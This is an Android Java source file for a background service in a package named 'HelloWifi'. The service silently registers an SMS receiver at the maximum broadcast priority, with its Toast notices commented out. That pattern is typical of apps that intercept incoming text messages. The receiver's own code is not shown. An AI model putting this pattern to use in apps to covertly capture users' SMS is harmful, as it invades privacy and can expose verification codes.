package your.com.HelloWifi;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.widget.Toast;


/**
 * 
 * @author chenjiyang hetanjin bianyougang
 * @category running in the background listening for SMS
 *
 */

public class BootService extends Service {

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
	public void onCreate() {
		//Toast.makeText(this, "BootService", Toast.LENGTH_LONG).show();
		IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
		intentFilter.setPriority(2147483647);
		SMSReceiver dynamicReceiver = new SMSReceiver();
		registerReceiver(dynamicReceiver, intentFilter);
	}
	@Override
	public void onDestroy() {
		//Toast.makeText(this, "BootService onDestroy", Toast.LENGTH_LONG).show();
	}

}
